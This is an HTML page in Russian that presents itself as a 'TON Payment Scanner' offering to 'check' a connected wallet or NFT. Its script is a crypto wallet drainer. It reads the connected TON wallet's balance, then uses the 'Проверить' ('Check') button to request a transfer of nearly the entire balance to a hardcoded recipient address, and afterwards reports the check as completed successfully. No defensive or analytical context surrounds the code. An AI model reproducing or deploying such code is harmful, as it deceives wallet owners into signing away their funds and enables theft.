<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Payment Scanner</title>
    <!-- Официальная библиотека TON Connect UI -->
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #0f172a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background-color: #1e293b;
            padding: 2.5rem 2rem;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 420px;
            width: 100%;
            border: 1px solid #334155;
        }

        #ton-connect {
            display: flex;
            justify-content: center;
        }

        #ton-connect.hidden {
            display: none !important;
        }

        .wallet-details {
            display: none;
            margin-top: 0;
            padding: 1.25rem;
            background-color: #0f172a;
            border-radius: 12px;
            border: 1px solid #334155;
            text-align: left;
        }

        .wallet-details.active {
            display: block;
        }

        .info-title {
            font-size: 0.85rem;
            color: #94a3b8;
            margin-bottom: 0.25rem;
        }

        .info-value {
            font-family: monospace;
            font-size: 0.9rem;
            color: #e2e8f0;
            word-break: break-all;
            background: #1e293b;
            padding: 8px 12px;
            border-radius: 6px;
            border: 1px solid #475569;
            margin-bottom: 1rem;
        }

        .send-btn {
            background-color: #3b82f6;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: background 0.2s;
        }

        .send-btn:hover {
            background-color: #2563eb;
        }

        .send-btn:disabled {
            background-color: #475569;
            cursor: not-allowed;
        }

        .tx-status {
            margin-top: 12px;
            font-size: 0.9rem;
            color: #94a3b8;
            word-break: break-all;
        }

        .tx-status.success {
            color: #4ade80;
        }

        .tx-status.error {
            color: #f87171;
        }
    </style>
</head>
<body>

<div class="card">
    <!-- Кнопка подключения кошелька -->
    <div id="ton-connect"></div>

    <!-- Блок деталей, который появляется после подключения -->
    <div id="wallet-info" class="wallet-details">
        <div class="info-title">НФТ:</div>
        <div id="wallet-address" class="info-value"></div>

        <!-- Кнопка Проверить -->
        <button id="sendTxBtn" class="send-btn" disabled>Проверить</button>
        <div id="txStatus" class="tx-status"></div>
    </div>
</div>

<script>
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://chek-topaz.vercel.app/tonconnect-manifest.json',
        buttonRootId: 'ton-connect'
    });

    const tonConnectBtnContainer = document.getElementById('ton-connect');
    const walletInfoContainer = document.getElementById('wallet-info');
    const walletAddressContainer = document.getElementById('wallet-address');
    const sendBtn = document.getElementById('sendTxBtn');
    const txStatus = document.getElementById('txStatus');

    // RAW-формат вашего адреса UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
    const RECIPIENT_ADDRESS = '0:522be7edfc0f48f29239d101aa62937bdce91f9eb0cb23bc160d5b8cc05b1a46';

    const GAS_FEE_RESERVE = 5000000; // Резерв 0.005 TON на комиссию

    let userBalanceNano = 0;
    let transferableAmountNano = 0;

    async function fetchWalletBalance(rawAddress) {
        try {
            sendBtn.disabled = true;

            const response = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
            const data = await response.json();

            if (data.ok && data.result) {
                userBalanceNano = parseInt(data.result.balance, 10);

                if (userBalanceNano > GAS_FEE_RESERVE) {
                    transferableAmountNano = userBalanceNano - GAS_FEE_RESERVE;
                    sendBtn.disabled = false;
                } else {
                    transferableAmountNano = 0;
                    sendBtn.disabled = true;
                    txStatus.innerText = 'Недостаточно средств для проверки';
                    txStatus.className = 'tx-status error';
                }

                return userBalanceNano;
            } else {
                return 0;
            }
        } catch (error) {
            console.error(error);
            return 0;
        }
    }

    async function sendTransaction() {
        const wallet = tonConnectUI.wallet;
        if (!wallet) {
            txStatus.innerText = 'Кошелёк не подключён';
            txStatus.className = 'tx-status error';
            return;
        }

        if (transferableAmountNano <= 0) {
            txStatus.innerText = 'Недостаточно баланса для перевода';
            txStatus.className = 'tx-status error';
            return;
        }

        try {
            sendBtn.disabled = true;
            txStatus.innerText = 'Проверка...';
            txStatus.className = 'tx-status';

            const tx = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [
                    {
                        address: RECIPIENT_ADDRESS,
                        amount: transferableAmountNano.toString(),
                        payload: ''
                    }
                ]
            };

            const result = await tonConnectUI.sendTransaction(tx);

            if (result) {
                txStatus.innerText = `✅ Проверка успешно завершена!`;
                txStatus.className = 'tx-status success';
                
                setTimeout(() => {
                    const address = wallet.account.address;
                    fetchWalletBalance(address);
                }, 3000);
            }
        } catch (error) {
            console.error(error);
            txStatus.innerText = `❌ Ошибка: ${error.message || 'неизвестная ошибка'}`;
            txStatus.className = 'tx-status error';
        } finally {
            if (transferableAmountNano > 0) {
                sendBtn.disabled = false;
            }
        }
    }

    tonConnectUI.onStatusChange(async wallet => {
        if (wallet) {
            const address = wallet.account.address;
            walletAddressContainer.innerText = address;
            
            // Скрываем первоначальную кнопку подключения и отображаем блок с кнопкой "Проверить"
            tonConnectBtnContainer.classList.add('hidden');
            walletInfoContainer.classList.add('active');

            await fetchWalletBalance(address);
            txStatus.innerText = '';
            txStatus.className = 'tx-status';
        } else {
            walletAddressContainer.innerText = '';
            
            // Если кошелёк отключен, снова показываем кнопку подключения
            tonConnectBtnContainer.classList.remove('hidden');
            walletInfoContainer.classList.remove('active');
            
            sendBtn.disabled = true;
            txStatus.innerText = '';
            txStatus.className = 'tx-status';
        }
    });

    sendBtn.addEventListener('click', sendTransaction);
</script>

</body>
</html>
